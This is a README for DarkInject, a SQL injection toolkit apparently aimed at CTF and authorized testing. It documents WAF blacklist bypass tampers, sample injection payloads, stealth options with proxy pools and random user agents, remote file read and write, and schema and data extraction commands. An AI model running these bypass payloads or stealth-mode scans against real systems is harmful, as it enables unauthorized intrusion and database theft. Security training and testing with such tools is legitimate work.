# DarkInject

**English** &nbsp;|&nbsp; [中文版 →](https://github.com/ETOH-ui/DarkInject)

> Modular, general-purpose, high-speed SQL injection exploitation toolkit
>
> Supports **4 injection techniques × 5 DBMS dialects × 14 tampers × automatic blacklist bypass**

<p align="center">
  <a href="https://github.com/ETOH-ui/DarkInject-EN"><img src="https://img.shields.io/badge/GitHub-ETOH--ui%2FDarkInject--EN-181717?logo=github" alt="repo"></a>
  <img src="https://img.shields.io/badge/version-1.2.0-blue" alt="version">
  <img src="https://img.shields.io/badge/python-3.6%2B-blue" alt="python">
  <img src="https://img.shields.io/badge/license-MIT-green" alt="license">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey" alt="platform">
</p>

---

## ⚠️ Disclaimer

> **This tool is intended for the following lawful purposes only:**
>
> - Systems that you **own yourself**, or for which you have obtained **written authorization** from the owner;
> - CTF competitions, online labs, teaching exercises and other **lawful practice environments**;
> - Locally hosted vulnerability reproduction and security research.
>
> **It is strictly forbidden** to use this tool against any **unauthorized** target. Users bear
>   
> full legal responsibility for any consequences of using this tool, including but not limited to the
>   
> Cybersecurity Law of the People's Republic of China, the Criminal Law of the People's Republic of China
>   
> (Article 285 — the crime of illegally intruding into computer information systems / the crime of illegally obtaining computer information system data;
>   
> Article 286 — the crime of destroying computer information systems), and the Law of the People's Republic of China
>   
> on Public Security Administration Punishments. **Attacking a system without authorization is unlawful and may lead to administrative penalties or even criminal prosecution.**
>
> This project is published for open-source learning and security research. The author **does not provide**
>   
> customization, done-for-you work, or technical support for any specific real-world target, and accepts no
>   
> liability for any misuse. By using this tool you confirm that you have read,
>   
> understood, and agreed to all of the terms above.

---

## 📖 Introduction

**DarkInject** is a modular SQL injection toolkit built for CTF competitions, authorized penetration tests, and SRC engagements.

It **focuses on one hard problem: injecting through strict blacklist filtering**:

- Comments filtered (`--` / `#` / `/* */`)? → automatically switches to comment-free payloads
- `union` / `sleep` / `extractvalue` filtered? → automatically degrades to Boolean blind
- Numeric POST only? → automatically probes 12 closing styles

### Highlight: automatic blacklist bypass

Hand the tool a copy of the WAF blacklist and it will infer the filter semantics, plan bypass strategies, and test them one by one:

```bash
python main.py -u URL --data "id=1" --blacklist blacklist.txt --waf-mode strip
```

| Filter semantics | Effective bypass | What the tool does |
| ------------------ | ----------------------------------- | ------------------------------- |
| `str_replace` single-pass removal | keyword nesting: `ununionion` → one removal leaves `union` | `keyword_nest` |
| Case-sensitive blacklist | change the case | `randomcase` / `lowercase` |
| Presence-based blocking | the keyword is simply unusable | automatic fallback: Boolean blind / heavy-query delay / switch to an error function that is not banned |
| Comments banned | comment-free payloads | every payload is comment-free by design |



---

## ✨ Features

| Feature | Description |
| ------------------- | ---------------------------------------------------------------------------------- |
| 🎯 **Auto probing** | baseline sampling (incl. content noise) + 12 closing styles + three-level length/status/content signal |
| 🚀 **4 injection techniques** | UNION / error-based / Boolean blind / time blind, with automatic fallback |
| 🌐 **5 DBMS dialects** | MySQL / MSSQL / Oracle / PostgreSQL / SQLite |
| 🛡️ **14 tampers** | randomcase / keyword_nest / space_alt / commentless / logic_alt / hex_string / ... |
| ⚡ **Fast extraction** | binary search + multithreaded concurrency + request cache + voting on key fields |
| 🎬 **Scroll animation** | long-running operations show a scrolling progress bar |
| 🕵️ **Anti-WAF mode** | delay jitter / random UA / proxy pool / human-like pacing |
| 💻 **Interactive shell** | query on demand after the scan |
| 🎨 **Colored banner** | signature ASCII logo + ANSI colors (Windows-compatible) |
| ⚖️ **Legal notice** | mandatory confirmation on every run — you must type `I AGREE` (cannot be bypassed or cached) |

---

## 📦 Installation

### Requirements

- Python 3.6+
- pip

### Steps

```bash
git clone https://github.com/ETOH-ui/DarkInject-EN.git DarkInject
cd DarkInject

# Create a virtual environment (optional but recommended)
python -m venv .venv
source .venv/bin/activate          # Linux / macOS
.venv\Scripts\activate             # Windows

# Install dependencies
pip install -r requirements.txt
```

---

## 🚀 Quick Start

### Scenario 1: Local lab (simplest)

```bash
python main.py -u http://127.0.0.1:45821/ --data "id=1" --param id
```

### Scenario 2: Database name already known — skip the blind injection (recommended)

```bash
python main.py -u http://127.0.0.1:26250/ --data "id=1" --param id \
    --technique B --db past_paper --workers 4
```

### Scenario 3: GET parameter injection

```bash
python main.py -u "http://target/news.php" --method GET \
    --position params --param id --params "page=1"
```

### Scenario 4: With Cookie / Header

```bash
python main.py -u http://target/ --data "id=1" --param id \
    --cookie "PHPSESSID=abc123; token=xyz" \
    --header "X-Forwarded-For: 127.0.0.1"
```

### Scenario 5: SRC stealth mode

```bash
python main.py -u http://target/ --data "id=1" \
    --stealth --proxy-file proxies.txt
```

### Scenario 6: JSON body / multiple parameters

```bash
# JSON request body: the payload is injected into the given field; a.b nested paths are supported
python main.py -u http://target/api --method POST --json \
    --data '{"id": 1, "user": {"name": "x"}}' --param user.name

# Not sure which parameter is injectable? Let it try each in turn and list the injectable ones
python main.py -u "http://target/news.php" --method GET \
    --position params --param id,cate,page
```

---

## ⚖️ Legal Notice Confirmation

**On first run the legal notice is displayed and the tool waits for you to type `I AGREE`:**

```text
============================================================
⚠️  Legal Disclaimer
============================================================
This tool is for authorized security testing only.
By using this tool you confirm:
  1. You have obtained explicit written authorization to test the target system
  2. You will comply with all applicable laws and regulations
  3. You bear sole responsibility for all legal consequences arising from your use of this tool
============================================================
Type 'I AGREE' to confirm that you have read and agree to the above terms: _
```

### There is only one mode: confirm every time

The legal confirmation **cannot be bypassed and cannot be cached**. There is no `--no-legal` and no `--cache-legal`:

- The full terms are shown on every run, and the user themselves must type `I AGREE`
- Wrong input / bare Enter / Ctrl-C → immediate `exit 1`, and at that point **no network request has been sent yet**
- No cache file is written and the previous result is not remembered

This is deliberate: the moment you allow "cached consent" or leave a "skip switch", this step becomes a formality in scripts.

For automation (the terms are still displayed in full; only the confirmation is piped in):

```bash
printf "I AGREE\n" | python main.py -u URL --data "id=1"
```

---

## 🛡️ Anti-WAF Stealth Mode

The default configuration is highly concurrent and fast-paced, which makes it easy for a WAF to block you instantly. The parameters below control pacing and disguise the traffic.

### One-shot stealth preset

```bash
python main.py -u URL --data "id=1" --stealth
```

`--stealth` automatically enables:

| Item | Value |
| ------------ | ------ |
| workers | 1 (single-threaded) |
| delay | 3 s |
| jitter | ±1 s |
| qps | 1 |
| random-agent | yes |
| human | yes |
| retries | 2 |

### Suggested combinations

| Scenario | Recommended parameters |
| --------- | ----------------------------------------------------- |
| Local lab | `--workers 2 --timeout 30` |
| Ordinary SRC site | `--workers 2 --delay 1 --jitter 0.5 --random-agent` |
| Site with a WAF | `--stealth --proxy-file proxies.txt` |
| Strict rate limiting | `--qps 1 --workers 1 --random-agent` |
| Fast but stealthy | `--workers 3 --delay 0.5 --jitter 0.3 --random-agent` |

### Proxy pool file format

```text
# proxies.txt
http://user:pass@1.2.3.4:8080
socks5://5.6.7.8:1080
http://9.10.11.12:3128
```

---

## 🕳️ Blacklist Bypass (CTF in Practice)

### Quick usage

```bash
# Paste the challenge's filter rules into a file and hand it to the tool
python main.py -u http://target/ --data "id=1" --param id \
    --blacklist blacklist.txt \
    --waf-mode strip          # auto / presence / strip / strip-recursive
```

The blacklist file accepts three formats (all recognized):

```text
# 1) Python list literal
BLACKLIST = ['union', 'sleep', 'extractvalue', '--', '#', '/*', '*/']

# 2) One per line
union
sleep
extractvalue

# 3) Comma-separated
union,sleep,extractvalue
```

### How to choose `--waf-mode`

| Value | Meaning | When to use |
| ----------------- | ---------------------------------------- | -------------- |
| `auto` (default) | make no assumption; try every strategy from cheapest to most expensive | filter implementation unknown |
| `presence` | reject on match (`stripos` hits → `die`) | blocking as soon as the keyword appears; mutation is useless |
| `strip` | single-pass removal (`str_replace` / non-recursive `preg_replace`) | nesting has the highest success rate and is tried first |
| `strip-recursive` | remove repeatedly until clean | nesting is useless; go straight to alternative spellings |

### What it does internally

```text
 1. Parse the blacklist tokens
 2. Infer the constraints: comments banned? spaces banned? which keywords are banned?
 3. Plan candidate strategies: raw → case → lower → nest → nest+blank → alt → charencode
 4. Adjust technique priority: if union is banned, try others first; if sleep is banned, move time blind later
 5. Test every (strategy × technique) pair against the target; the first one that probes successfully wins
 6. Print the final technique and strategy
```

At runtime it tells you exactly what it picked:

```text
[*] Technique priority: E > B > U > T
[*] Strategy 1/8: nest  [keyword_nest]
    [+] Column count: 3
    [+] Visible column: column 1
    [+] Reflected marker: quoted string
[+] Using technique: Union Based  (strategy: nest / keyword_nest)
```

### Tamper list (14 in total)

| Name | Effect | Use when |
| ------------------------- | ------------------------------------ | ------------ |
| `keyword_nest` | keyword nesting: `union` → `ununionion` | single-pass replacement blacklist |
| `lowercase` | lowercase everything | the implementation only checks uppercase keywords |
| `randomcase` | random casing | case-sensitive blacklist |
| `space_alt` | space → a real `\t\n\r\f` | spaces banned |
| `logic_alt` | `AND` → `&&`, `=` → `LIKE`, `SUBSTR` → `MID` | shrink the keyword surface |
| `hex_string` | `'abc'` → `0x616263` | quotes / literals are being scanned |
| `commentless` | strip comment markers | comments banned |
| `space2mysqlblank` | same as `space_alt` (historical name kept) | spaces banned |
| `space2comment` | space → `/**/` | comments allowed |
| `charencode` | URL-encode the whole string (sent raw) | need to defeat double-decoding detection |
| `apostrophemask` | `'` → full-width apostrophe | single quotes blocked |
| `equaltolike` / `between` | alternative spellings for comparison operators | `=` / `>` blocked |

> Note: `keyword_nest` only nests **words that actually appear in the blacklist**.
>   
> If you nest a word that is not filtered, the SQL engine still receives `ununionion` and you get a syntax error.
>   
> Also, every tamper only acts **outside quotes**, so it will never corrupt a database name such as `'past_paper'`.

---

## 🧪 Local Self-Test (offline + lab)

### 1. Offline self-test matrix

No target required — it validates each strategy directly against three filter-semantics models:

```bash
python selftest/blacklist_selftest.py --blacklist lab/blacklist_ctf.txt
```

Sample output (excerpt):

```text
▸ union (numeric)
  payload: -1 UNION SELECT 1,2,3
    ✗ presence(i)  reject on match → (no strategy available under this semantics)
    ✓ presence(cs) reject on match → raw, case, alt
    ✓ strip(single,i)  remove once → nest, nest+blank, nest+alt
    ✓ strip(single,cs) remove once → raw, case, nest, nest+blank, alt, nest+alt
    ✗ strip(recursive,i)  remove until clean → (no strategy available under this semantics)

▸ time-based (heavy query)
  payload: 1 AND IF((1>2),(SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C),0)
    ✓ presence(i)  reject on match → raw, case, lower, nest, nest+blank

▸ boolean blind injection
  payload: 1 AND (ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114)
    ✓ presence(i)  reject on match → raw, case, lower, nest, nest+blank
```

This matrix is the most direct evidence for deciding "which filter calls for which bypass".

### 2. SQLite lab, end to end

`lab/vuln_app.py` is a deliberately vulnerable injection point carrying the same blacklist (no external database required):

```bash
# Terminal A: start the lab (strip = single-pass removal filter)
python lab/vuln_app.py --filter strip_single_i --port 8899

# Terminal B: break through with union (it will auto-select the keyword_nest strategy)
python main.py -u http://127.0.0.1:8899/ --method GET --position params --param id \
    --dbms sqlite --blacklist lab/blacklist_ctf.txt --waf-mode strip --technique U

# Switch to presence mode (union is completely unusable); the tool degrades to Boolean blind
python lab/vuln_app.py --filter presence_i --port 8900   # start another one
python main.py -u http://127.0.0.1:8900/ --method GET --position params --param id \
    --dbms sqlite --blacklist lab/blacklist_ctf.txt --waf-mode presence --charset flag
```

Both modes yield `flag{un10n_n3st1ng_w0rk5}`.

### 3. Flat-length target (validating content diff)

`--flat-len` pads every response body to a fixed byte count, so true / false are **exactly the same length** and can only be told apart by response body content:

```bash
python lab/vuln_app.py --port 8901 --flat-len 4096
python main.py -u "http://127.0.0.1:8901/?id=1" --method GET --position params \
    --param id --dbms sqlite --technique B
```

The output tells you exactly which signal was used:

```text
[+] Baseline: len=4096B (jitter±0B, content noise 0.0%)
[+] Closing: numeric  (signal: content)
    True/False have equal length (4096B), switching to content diff to distinguish
    [*] Response lengths indistinguishable -> switching to response body content diff
```

### 4. JSON body / multiple parameters

```bash
python lab/vuln_app.py --port 8902
python main.py -u "http://127.0.0.1:8902/api" --method POST --json \
    --data '{"id": 1}' --param id,foo --dbms sqlite --technique B
```

The lab's POST endpoint accepts both `application/json` and `form-urlencoded`; `--param id,foo` probes the two fields in turn and reports which one is injectable.

---

## 🎛️ Parameter Reference

### Basic request

| Parameter | Description | Default |
| ------------ | ----------------------------------------- | ------ |
| `-u, --url` | Target URL | **required** |
| `--method` | GET / POST / PUT | POST |
| `--position` | `data` / `params` / `headers` / `cookies` | data |
| `--param` | injection parameter name; may be passed multiple times or comma-separated (each is probed in turn) | id |
| `--data` | base POST data; with `--json`, the JSON text | - |
| `--json` | send the body as JSON; the payload is injected into the `--param` field (`a.b` supported) | - |
| `--params` | base URL parameters | - |
| `--header` | custom header (repeatable) | - |
| `--cookie` | cookie string | - |
| `--timeout` | request timeout in seconds | 10 |
| `--space` | space replacement, e.g. `%0a` / `%09` | space |
| `--verbose` | log level 0 / 1 / 2 | 1 |

### Injection control

| Parameter | Description | Default |
| --------------- | --------------------------------------------------------------- | ---- |
| `--technique` | `auto` / `B` / `T` / `E` / `U` | auto |
| `--dbms` | `auto` / `mysql` / `mssql` / `oracle` / `postgresql` / `sqlite` | auto |
| `--db` | specify the database name directly (skips blind injection) | - |
| `--tamper` | tamper chain, comma-separated | - |
| `--blacklist` | WAF blacklist file; enables automatic bypass strategies | - |
| `--waf-mode` | `auto` / `presence` / `strip` / `strip-recursive` | auto |
| `--fingerprint` | fingerprint only | - |
| `--file-read` | read a remote file | - |
| `--file-write` | local path::remote path | - |
| `--max-rows` | maximum rows to fetch per table | 3 |
| `--charset` | blind-injection charset: `full/flag/hex/alnum/digit/lower/sql` or custom | full |
| `--fast` | cast only 1 vote per blind-injection decision (halves requests; occasional jitter may cause errors) | - |
| `--no-banner` | do not show the banner | - |

### Legal notice

**No parameters** — the legal confirmation cannot be skipped or cached; `I AGREE` must be typed on every run.

### Stealth / anti-WAF

| Parameter | Description |
| -------------------- | ----------------------------- |
| `--workers N` | number of concurrent threads; 1-2 recommended for stealth |
| `--delay N` | fixed delay of N seconds after each request |
| `--jitter N` | random delay jitter of ± N seconds |
| `--qps N` | global QPS cap |
| `--human` | human-like pacing |
| `--stealth` | one-shot stealth preset |
| `--random-agent` | random UA per request |
| `--user-agent "..."` | custom fixed UA |
| `--proxy URL` | single proxy |
| `--proxy-file FILE` | proxy pool file |
| `--proxy-rotate` | round-robin / random / single |
| `--retries N` | number of retries on failure |
| `--retry-delay N` | seconds to wait before retrying |

---

## 💻 Interactive Shell

After startup you enter a `>>>` prompt supporting the following commands:

| Command | Description |
| ----------------- | ------------------------------------ |
| `expr <SQL>` | **extract an arbitrary SQL expression directly** (a CTF workhorse — dozens of times faster than walking row by row) |
| `tables` | list all tables in the current database |
| `columns <table>` | list all columns of a table |
| `data <table>` | fetch the data of a table |
| `db` | current database name |
| `version` | database version |
| `user` | current user |
| `stats` | request statistics |
| `help` | help |
| `q` | quit |


### `expr`: pull out an entire dataset in one shot

Walking row by row (`tables` / `columns` / `data`) extracts "length + name" separately each time, which costs a lot of requests. Use `expr` together with `GROUP_CONCAT` to retrieve everything with a single expression:

```text
>>> expr (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())
  [+] flag_table,past_paper,public_subjects

>>> expr (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x666c61675f7461626c65)
  [+] id,flag

>>> expr (SELECT GROUP_CONCAT(flag) FROM flag_table)
  [+] moectf{...}
```

> ⚠️ **Charset pitfall**: characters that are not in the blind-injection charset are silently mapped to the nearest character not exceeding them (for example `+` inside a flag gets read as `*`). The `flag` preset covers the common symbols as far as possible; when in doubt use `--charset full`. After extraction the tool **automatically runs a whole-string verification** and prints `[!] Verification failed` if the result is inconsistent.

### Usage example

```text
[5/5] Entering interactive shell
==============================================================
💡 Type help for help, q to quit
==============================================================

>>> tables
  - flag_table
  - users
  - public_subjects

>>> columns flag_table
  - id
  - flag

>>> expr (SELECT GROUP_CONCAT(flag) FROM flag_table)
  [+] flag{example_flag}

>>> data flag_table
  📋 Table flag_table data:
    (1, 'flag{example_flag}')

>>> stats
  Total requests: 187
  Errors:   0
  Total time:   42.3s

>>> q
```

---

## 🏗️ Project Structure

```text
DarkInject/
├── main.py                     # entry point
├── requirements.txt            # dependencies
├── README.md                   # this document
├── core/                       # engine core
│   ├── requester.py            #   HTTP requester (cache + throttle + UA + proxy + raw sending)
│   ├── detector.py             #   closing style & echo-feature probing (comment-free candidates first)
│   ├── fingerprinter.py        #   DBMS fingerprinting
│   ├── engine.py               #   strategy × technique search scheduler
│   ├── blacklist.py            #   blacklist parsing + semantics inference + bypass strategy planning
│   ├── dumper.py               #   unified database traversal API (with voting)
│   ├── throttle.py             #   request throttler
│   ├── proxy_pool.py           #   proxy pool
│   └── waf_detector.py         #   WAF probing
├── techniques/                 # injection techniques
│   ├── base.py                 #   abstract base class (incl. expression calibration)
│   ├── boolean.py              #   Boolean blind (differential decision + expression calibration)
│   ├── time.py                 #   time blind (rotating delay spellings)
│   ├── error.py                #   error-based (iterating over error functions)
│   └── union.py                #   UNION-based (multi-marker encoding + comment-free closing)
├── dbms/                       # DBMS dialects (function spelling variants)
│   ├── base.py
│   ├── mysql.py
│   ├── mssql.py
│   ├── oracle.py
│   ├── postgresql.py
│   └── sqlite.py
├── tamper/                     # WAF bypass
│   ├── chain.py                #   tamper chain (can build nesting from the blacklist)
│   ├── _util.py                #   helpers that only transform outside quotes
│   ├── keyword_nest.py         #   keyword nesting
│   ├── space_alt.py            #   whitespace replacement (real control characters)
│   ├── commentless.py          #   strip comments
│   ├── logic_alt.py            #   alternative logic/function spellings
│   ├── hex_string.py           #   string → hex
│   ├── lowercase.py            #   lowercase everything
│   ├── randomcase.py
│   ├── space2comment.py
│   ├── space2mysqlblank.py
│   ├── charencode.py
│   ├── apostrophemask.py
│   ├── equaltolike.py
│   └── between.py
├── selftest/                   # offline self-test
│   ├── blacklist_selftest.py   #   effectiveness matrix: three filter semantics × each strategy
│   └── result_matrix.txt       #   snapshot of the self-test result for the current blacklist
├── lab/                        # local lab (SQLite, no external database needed)
│   ├── vuln_app.py             #   injectable app with the same blacklist and switchable filter modes
│   ├── blacklist_ctf.txt       #   moectf 2026 "Notorious Bandit" challenge addendum (raw filter list)
│   ├── blacklist_moectf.txt    #   consolidated version from testing: usable/blocked keywords + lab profile
│   └── writeup_moectf_archive.md  # same-challenge writeup (full Boolean-blind extraction walkthrough)
├── exploit/                    # post-exploitation
│   └── file_ops.py             #   file read/write
├── ui/                         # presentation layer
│   ├── banner.py               #   ASCII banner + legal notice
│   ├── cli.py                  #   argument parsing
│   ├── legal.py                #   legal notice confirmation
│   ├── printer.py              #   tree output
│   ├── progress.py             #   scroll animation
│   ├── shell.py                #   interactive shell
│   └── stats.py                #   request statistics
└── utils/                      # general utilities
    ├── helpers.py              #   parsing & formatting
    ├── logger.py               #   logging
    └── ua_pool.py              #   User-Agent pool
```

---

## 🧠 How It Works

```text
   Startup
    │
    ▼
 [0/5] Legal confirmation ── mandatory I AGREE input (every run, cannot be skipped / cannot be cached)
    │
    ▼
 [1/5] Closing probe ─── baseline sampling first (median of 3 requests + jitter + content noise), then try 12 closing styles
    │
    ▼
 [2/5] DBMS fingerprinting ─── try error-echo keywords first, then Boolean fingerprints, finally default to MySQL
    │
    ▼
 [3/5] Technique selection ─── in auto mode degrade UNION → ERROR → BOOLEAN → TIME, testing each (strategy × technique) pair
    │
    ▼
 [4/5] Database name retrieval ─── extract the current database name (skipped when --db is given)
    │
    ▼
 [5/5] Interactive shell ─── query tables / columns / data / arbitrary expressions on demand
    │
    ▼
  Database traversal ──── database → table → column → row → tree output
```

### Key design decisions

1. **Legal notice**: mandatory confirmation on every run; you must type `I AGREE` (cannot be bypassed or cached)
2. **Closing probe**: does not rely on comment markers; supports pure Boolean decisions of the form `1 AND 1=1`
3. **Binary search**: at most 7 requests per character (ASCII 32-126)
4. **Concurrent extraction**: 4 threads by default, 8 characters extracted simultaneously
5. **Voting**: key fields (database/table/column names) are extracted N times in a row and the majority wins, avoiding concurrency misreads
6. **Request cache**: identical payloads are not sent twice
7. **Blacklist strategy search**: candidate strategies are planned and then tested one by one; the target's real response decides success
8. **Differential decision**: for Boolean blind, a same-width "definitely-false sample" is sent for the same condition and the difference between the two lengths decides truth. This ignores the interference of "the target echoing the SQL, inflating the response length with the payload"
9. **Quote-aware tampering**: every tamper acts only outside quotes, so it never corrupts database/table names or data

---

## 🚧 Scope & Limitations

DarkInject follows the classic "single request, immediate echo" model, and its capabilities have a clear ceiling. What it can and cannot do is spelled out below to prevent misuse and misjudgement.

### ✅ Injection points it can handle

- **Position**: the parameter "value" position, i.e. a form such as `WHERE id = $inject`
- **Request position**: POST body / GET params / Header / Cookie
- **Closing form**: numeric, single-quote, double-quote, parenthesized — probed automatically, no manual specification needed
- **Body type**: `form-urlencoded` and JSON (`--json`, with `--param` supporting `a.b` nested paths)
- **Multiple parameters**: `--param a,b` or repeated `--param`; each is probed and the injectable ones are listed

### 🧩 Decision signals (not just length)

Neither the closing probe nor Boolean blind relies on response length alone; both degrade through three levels:

1. **Length difference** — the most classic and most reliable
2. **Status code difference** — some frameworks use different HTTP statuses for true/false
3. **Response body chunked diff** — the last resort when the length is flattened by a template

While sampling the baseline it also estimates "content noise" (timestamps, CSRF tokens and other random elements). The noisier the page, the higher the threshold for the content signal, which prevents random content from being mistaken for an echo. Once the closing probe reports `True/False have equal length`, Boolean blind automatically switches to content-diff mode.

### ❌ Injection points it does not support

| Scenario | Note |
| --- | --- |
| After `ORDER BY` | no closing probe is done at the sort-field position |
| After `LIMIT` | same as above |
| Table name / column name position | only "values" are handled, not identifiers |
| Inside an `IN()` list | injection inside the list is not covered |
| Stacked injection | no `;` multi-statement technique; the technique stack is only B / T / E / U |
| Second-order / stored | a single-request immediate-echo model; it does not track a second trigger after the data is stored |

### ⚠️ Known limitations

1. **Targets whose length and content are both identical still cannot be decided**
   If the true / false response bodies are byte-for-byte identical (even the content diff is 0), the target produces
   no observable difference at all — the only option is to switch to time blind, and the closing probe stage will still fail.
2. **`--json` does not stack with raw-class tampers**
   In JSON mode the payload must be serialized before it is sent, so a tamper such as `charencode` that relies on
   "already-encoded text pasted in verbatim" will not take effect (`raw_mode` is ignored).

### 📮 About request body encoding

- Default: the body is assembled as `application/x-www-form-urlencoded` (`--data "id=1"`)
- JSON: add `--json`, pass the JSON text via `--data`, and the payload is injected into the field named by `--param`

```bash
python main.py -u http://target/api --method POST --json \
  --data '{"id": 1, "user": {"name": "x"}}' --param user.name
```

---

## 📝 Usage Tips

### Speeding things up

```bash
# When the database name is known, skip the big blind-injection stage
python main.py -u URL --data "id=1" --db known_db --workers 4

# Query only a specific table (after entering the shell)
>>> data flag_table
```

### Bypassing a blacklist

```bash
# Spaces are filtered
python main.py -u URL --data "id=1" --space "%0a"

# Keywords are filtered (case obfuscation)
python main.py -u URL --data "id=1" --tamper randomcase
```

### Debugging

```bash
# Verbose logging
python main.py -u URL --data "id=1" --verbose 2

# Route through Burp
python main.py -u URL --data "id=1" --proxy http://127.0.0.1:8080
```

---

## ⚠️ FAQ

### Q1: `ModuleNotFoundError: No module named 'requests'`

```bash
# Activate the virtual environment and reinstall
.venv\Scripts\activate
pip install requests
```

### Q2: Closing-style probing fails

- Check that the URL is reachable
- Check that the `--param` name is correct (inspect the request with F12)
- Check whether cookie authentication is required
- Try `--timeout 30`
- If everything above is fine and the parameter is confirmed injectable yet it still fails, it is most likely that
  the true / false **response bodies are byte-for-byte identical** (even the content diff is 0) — the target
  produces no observable difference and the only option is a time-blind approach
  (see the known limitations under "🚧 Scope & Limitations" above)

### Q3: The database name is detected incorrectly

Misjudgement can happen under concurrency. Solutions:

- Specify it manually with `--db`
- Or lower `--workers 1`
- Key fields already have a voting mechanism; it can be strengthened via `Dumper(engine, votes=3)` in `core/dumper.py`

### Q4: The banner is garbled on Windows

Use **Windows Terminal** or the **PyCharm built-in terminal**, and switch the font to `Cascadia Code` or `Consolas`.

### Q5: Blind injection is too slow

Boolean blind has a hard physical efficiency ceiling. Suggestions:

- Prefer `--technique auto` (tries UNION and error-based automatically)
- Use `--db` when the database name is known
- Raise `--workers` (4-8 is fine for a local lab)

### Q6: Having to type `I AGREE` every time is annoying

This is deliberate — the legal confirmation does not accept "remember last time" or a "skip switch".
For automation you can pipe the confirmation in (the terms are still displayed in full):

```bash
printf "I AGREE\n" | python main.py -u URL --data "id=1"
```

---

## 📋 Release Notes

> This repository is the **first public release**, version `v1.2.0`. What follows is the complete feature set as it stands.

### Injection capabilities

- **4 injection techniques**: UNION / error-based / Boolean blind / time blind, degrading automatically according to what the target supports
- **5 DBMS dialects**: MySQL / MSSQL / Oracle / PostgreSQL / SQLite
- **Automatic probing**: baseline sampling (incl. content-noise estimation) + 12 closing styles + three-level length/status/content signal
- **Request body forms**: form-urlencoded and JSON (`--json`, with `--param` supporting `a.b` nested field paths)
- **Multiple parameters**: several `--param` values can be passed at once; each is probed and the injectable ones are summarized
- **Dialect function variants**: `length` / `substr` / `ascii` / `concat` / hex literals are all generated per dialect
  - `hex_to_str()`: MySQL `0x..` / SQLite `CAST(x'..' AS TEXT)` / MSSQL `CONVERT(VARCHAR(MAX),0x..)` /
    PostgreSQL `CONVERT_FROM(DECODE(..))` / Oracle `UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW(..))`

### Automatic blacklist bypass (CTF-oriented)

- `--blacklist` + `--waf-mode`: feed it a set of filter rules and it infers the **filter semantics** and searches for usable bypass strategies
- **Three filter-semantics models**: `presence` (reject on match) / `strip_single` (remove once) / `strip_recursive` (remove repeatedly),
  each further split into case-sensitive and case-insensitive
- **14 tampers**: `randomcase` / `keyword_nest` / `space_alt` / `commentless` / `logic_alt` /
  `hex_string` / `lowercase` / `space2comment` / `space2mysqlblank` / `charencode` /
  `apostrophemask` / `equaltolike` / `between` / `chain`
- **Comment-free payloads**: every payload is comment-free by design — it keeps working when comment markers are banned
- **Automatic fallback when keywords are fully banned**: Boolean blind → heavy-query delay → switch to an error function that is not banned
- **Function rotation**: `SLEEP` → `BENCHMARK` / `GET_LOCK` / full-table Cartesian heavy query;
  `extractvalue` / `updatexml` → `GTID_SUBSET` / geometric functions / `EXP` overflow / `JSON_KEYS`
- **Three encodings for echoed markers**: hex → quoted → `CHAR()`, compatible with non-MySQL engines

### Blind-injection reliability and speed

- **Differential decision**: compared against a same-width "must-be-false sample"; no longer relies on a fixed length threshold
- **False-sample length cache**: on a stable target each decision drops from 2 requests to 1, roughly doubling the speed
- **Whole-string verification + self-healing re-extraction**: the result is re-checked automatically after extraction; if verification fails the cache is cleared, caching is disabled, and it extracts once more (twice as slow, but trustworthy)
- **Only 2xx/3xx responses accepted**: an occasional 5xx error page can no longer pollute the binary search as a valid length sample
- **2-vote decision + tie-breaker**: avoids a single network hiccup flipping a character
- Binary search has an iteration cap and will not loop forever
- `--fast` switches to single-vote decisions for extra speed (the default is still the robust 2 votes)
- The `flag` preset charset covers common symbols (`+ | = ~ : ; , . / ?` etc.), avoiding the silent "nearest character" error

### Data extraction efficiency

- **Interactive shell**: query on demand after the scan finishes
- **`expr <SQL>`**: extract an arbitrary expression directly; with `GROUP_CONCAT` you can pull the whole schema / dataset in one shot
- `--db <name>` skips the database-name blind-injection stage

### Stealth and anti-detection

- `--stealth` one-shot preset; granular `--delay` / `--jitter` / `--qps` / `--human` / `--random-agent` / `--user-agent`
- Proxy pool: `--proxy` / `--proxy-file` / `--proxy-rotate`
- The requester has a `raw` send mode, so encoding-class tampers are not double-encoded

### Local self-test (no external environment needed)

- `selftest/blacklist_selftest.py`: an **offline effectiveness matrix** of three filter semantics × each strategy
- `lab/vuln_app.py`: a SQLite lab with `--filter` (six filter modes), `--flaky N` (fault injection),
  `--flat-len N` (flat-length mode — all response lengths identical, for validating content diff), and a POST JSON endpoint

### Safety and compliance

- **The legal notice cannot be bypassed**: every run requires typing `I AGREE`; there is no skip switch and nothing is cached
- See the "Disclaimer" above and the "Legal and Ethical Use Statement" at the end

---

## 📄 License

This project is intended for **cybersecurity learning, CTF competitions, and authorized penetration testing** only.

**Any unauthorized use has nothing to do with the author; the user bears all legal responsibility.**

---

## ⚠️ Legal and Ethical Use Statement

**Please read the following statement carefully before using this tool. By using this tool you confirm that you have read, understood, and agreed to be bound by the terms below.**

### 1. Authorization requirements

This tool may be used **only** in the following scenarios:

- Testing a system that **you own**
- Testing a system for which you have obtained **explicit written authorization** (the authorization document must clearly define the scope, time frame, and rules of engagement)
- Educational or research use in an **isolated, controlled laboratory environment**
- Testing to the extent **explicitly permitted by the rules of a bug bounty program**

**Using this tool without the authorization above is unlawful.**

### 2. Prohibited uses

**It is strictly forbidden** to use this tool for:

- Any unauthorized access to a system or acquisition of data
- Any form of malicious attack, sabotage, or intrusion
- Any act that violates the laws and regulations of your jurisdiction
- Any act that infringes on the privacy or intellectual property of others

### 3. Legal compliance responsibility

The user **bears sole responsibility** for complying with all applicable laws and regulations. You must comply with, including but not limited to, the Cybersecurity Law of the People's Republic of China, the Criminal Law of the People's Republic of China, and all relevant laws of your own jurisdiction.

### 4. Limitation of liability

**The author and contributors accept no liability for any direct, indirect, incidental, or consequential damages arising from the use or misuse of this tool, whether or not such damages were foreseeable.** The author expressly opposes any unauthorized use.

### 5. Effect of this disclaimer

This statement does not constitute authorization for any particular use. Users must **independently judge** whether their use is lawful.

---

<p align="center">
  <b>Happy Hacking! 🚩</b>
</p>
